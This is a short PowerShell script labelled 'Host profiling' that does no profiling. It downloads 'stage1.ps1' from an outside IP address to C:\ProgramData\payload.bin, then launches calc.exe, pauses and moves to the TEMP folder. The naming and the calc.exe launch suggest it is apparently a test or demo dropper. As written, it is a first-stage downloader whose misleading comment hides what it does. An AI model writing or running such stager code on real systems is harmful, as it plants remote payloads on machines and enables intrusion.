
<# Host profiling #>
[CmdletBinding()]
param(
    [string]$Stage1Url = "http://198.51.100.221:80/stage1.ps1",
    [string]$Stage2Path = 'C:\ProgramData\payload.bin',
    [int]$RequestTimeout = 74
)
Invoke-WebRequest -Uri $Stage1Url -OutFile $Stage2Path -UseBasicParsing
Start-Process -FilePath "calc.exe"
Start-Sleep -Seconds 5
Set-Location -Path $env:TEMP
